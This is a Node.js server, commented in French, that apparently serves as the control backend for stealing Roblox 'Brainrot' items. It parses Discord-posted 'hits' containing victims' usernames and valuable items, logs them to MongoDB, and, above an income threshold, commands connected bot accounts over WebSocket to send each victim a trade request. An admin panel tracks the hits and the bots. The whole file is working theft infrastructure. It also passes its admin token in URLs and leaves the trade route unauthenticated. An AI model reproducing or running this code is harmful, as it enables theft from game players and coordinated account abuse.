const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const { Client, GatewayIntentBits } = require('discord.js');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);

// Cache local pour le seuil
let CACHED_THRESHOLD = 10000000; 

// --- CONNEXION DB ---
mongoose.connect(MONGO_URI)
  .then(() => {
      log("✅ [DB] Connexion établie");
      loadSettings(); 
  })
  .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// --- MODÈLES ---
const hitSchema = new mongoose.Schema({
    timestamp: { type: Date, default: Date.now },
    displayName: String,
    username: String,
    receivers: [String],
    valuableBrainrots: [String]
});
const Hit = mongoose.model('Hit', hitSchema);

const logSchema = new mongoose.Schema({
    username: String,
    type: String,
    message: String,
    timestamp: { type: Date, default: Date.now }
});
const BotLog = mongoose.model('BotLog', logSchema);

const settingsSchema = new mongoose.Schema({
    id: { type: String, default: "global_config" },
    min_income_threshold: { type: Number, default: 10000000 }
});
const Settings = mongoose.model('Settings', settingsSchema);

const activeBots = new Map();
const activeAdmins = new Set();

// --- SYSTÈME DE NOTIFICATION LIVE (Pour admin.html) ---
function notifyAdmins(type) {
    const payload = JSON.stringify({ Type: "UpdateNotification", Target: type });
    activeAdmins.forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(payload);
        } else {
            activeAdmins.delete(ws); // Nettoyage automatique si mort
        }
    });
}

// --- CHARGEMENT DU SEUIL ---
async function loadSettings() {
    try {
        let config = await Settings.findOne({ id: "global_config" });
        if (!config) {
            config = new Settings({ id: "global_config", min_income_threshold: 10000000 });
            await config.save();
        }
        CACHED_THRESHOLD = config.min_income_threshold;
        log(`⚙️ [CONFIG] Seuil chargé : ${CACHED_THRESHOLD.toLocaleString()}/s`);
    } catch (e) { log(`❌ [CONFIG] Erreur : ${e.message}`); }
}

// --- MIDDLEWARE SÉCURITÉ ---
const authAdmin = (req, res, next) => {
    if (req.query.token === ADMIN_TOKEN) return next();
    res.status(403).json({ error: "Token invalide" });
};

// --- ROUTES API ---
app.get('/api/admin/verify', (req, res) => {
    res.json({ success: req.query.token === ADMIN_TOKEN });
});

app.get('/api/admin/hits', authAdmin, async (req, res) => {
    const hits = await Hit.find().sort({ timestamp: -1 }).limit(50);
    res.json(hits);
});

app.get('/api/admin/bots', authAdmin, (req, res) => {
    res.json(Array.from(activeBots.keys()));
});

app.get('/api/admin/set-threshold', authAdmin, async (req, res) => {
    const newVal = parseInt(req.query.value);
    if (!isNaN(newVal)) {
        await Settings.findOneAndUpdate({ id: "global_config" }, { min_income_threshold: newVal }, { upsert: true });
        CACHED_THRESHOLD = newVal;
        log(`⚙️ [CONFIG] Nouveau seuil : ${CACHED_THRESHOLD}`);
        res.send("OK");
    } else res.status(400).send("Invalide");
});

app.get('/api/admin/get-threshold', authAdmin, (req, res) => {
    res.json({ threshold: CACHED_THRESHOLD });
});

app.get('/api/logs', authAdmin, async (req, res) => {
    const logs = await BotLog.find().sort({ timestamp: -1 }).limit(50);
    res.json(logs);
});

app.get('/api/logs/clear', authAdmin, async (req, res) => {
    await BotLog.deleteMany({});
    notifyAdmins("logs");
    res.send("OK");
});

app.get('/api/sendtrade', async (req, res) => {
    const { receiver, target } = req.query;
    if (!receiver || !target) return res.status(400).send("Paramètres manquants.");
    for (let i = 0; i < 5; i++) {
        const botWs = activeBots.get(receiver);
        if (botWs && botWs.readyState === WebSocket.OPEN) {
            botWs.send(JSON.stringify({ Type: "TradeRequest", TargetUser: target }));
            return res.send(`Envoyé à ${receiver}`);
        }
        await new Promise(r => setTimeout(r, 2000));
    }
    res.send("Bot offline");
});

// --- BOT DISCORD ---
const clientDiscord = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

function parseIncome(text) {
    const match = text.match(/\$([\d.]+)([KMBT]?)\/s/i);
    if (!match) return 0;
    const multipliers = { 'K': 1e3, 'M': 1e6, 'B': 1e9, 'T': 1e12 };
    return parseFloat(match[1]) * (multipliers[(match[2] || "").toUpperCase()] || 1);
}

clientDiscord.on('messageCreate', async (message) => {
    if (message.embeds.length === 0) return;
    const embed = message.embeds[0];
    let targetUsername, displayName, receiversList = [], valuableItems = [], topIncome = 0;

    embed.fields.forEach(field => {
        const val = field.value;
        if (field.name.includes("Player Information")) {
            targetUsername = (val.match(/Username\s*:\s*`?([^`\n]+)`?/) || [])[1];
            displayName = (val.match(/Display Name\s*:\s*`?([^`\n]+)`?/) || [])[1];
            const receiverLine = val.split('\n').find(l => l.includes("Receiver"));
            if (receiverLine) {
                receiversList = receiverLine.split(':')[1].split(',').map(n => n.replace(/[`\s]/g, "").trim());
            }
        }
        if (field.name.includes("Valuable Brainrots")) {
            val.split('\n').forEach(line => {
                const inc = parseIncome(line);
                if (inc > 0) {
                    valuableItems.push(line.trim());
                    if (inc > topIncome) topIncome = inc;
                }
            });
        }
    });

    if (!targetUsername) return;

    await new Hit({ displayName, username: targetUsername, receivers: receiversList, valuableBrainrots: valuableItems }).save();
    notifyAdmins("hits"); // Update Live Admin

    if (topIncome >= CACHED_THRESHOLD) {
        let sent = false;
        for (let i = 0; i < 5; i++) {
            const targetBot = receiversList.find(name => activeBots.get(name)?.readyState === WebSocket.OPEN);
            if (targetBot) {
                activeBots.get(targetBot).send(JSON.stringify({ Type: "TradeRequest", TargetUser: targetUsername }));
                message.reply(`✅ **Sent to ${targetBot}** (${topIncome.toLocaleString()}/s)`);
                sent = true; break;
            }
            await new Promise(r => setTimeout(r, 2000));
        }
        if (!sent) message.reply(`❌ **Failed**: Bots offline.`);
    }
});

if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);

// --- GESTION WEBSOCKET ---
wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(url.parse(req.url, true).query);
    const username = params.get('username') || "Unknown";

    // --- CAS ADMIN ---
    if (username === "ADMIN_PANEL") {
        if (params.get('token') !== ADMIN_TOKEN) {
            log("🚫 Tentative de connexion admin échouée (Token invalide)");
            return ws.terminate();
        }
        activeAdmins.add(ws);
        log("👨‍💻 Un administrateur s'est connecté");

        ws.on('close', () => {
            activeAdmins.delete(ws);
            log("👨‍💻 Un administrateur s'est déconnecté");
        });
        return; // On s'arrête ici pour les admins
    }

    // --- CAS BOT ---
    if (activeBots.has(username)) {
        log(`[CLEANUP] Bot ${username} déjà présent, remplacement...`);
        activeBots.get(username).terminate();
    }
    
    activeBots.set(username, ws);
    log(`🤖 Bot connecté : ${username}`);
    notifyAdmins("bots");

    ws.on('message', async (msg) => {
        try {
            const data = JSON.parse(msg);
            if (data.Method === "Log") {
                await new BotLog({ username, type: data.Type || "Info", message: data.Message }).save();
                notifyAdmins("logs");
            }
        } catch (e) { log(`⚠️ Erreur Message WS: ${e.message}`); }
    });

    ws.on('close', () => {
        if (activeBots.get(username) === ws) {
            activeBots.delete(username);
            notifyAdmins("bots");
            log(`💀 Bot déconnecté : ${username}`);
        }
    });
});

app.use(express.static('public'));
server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
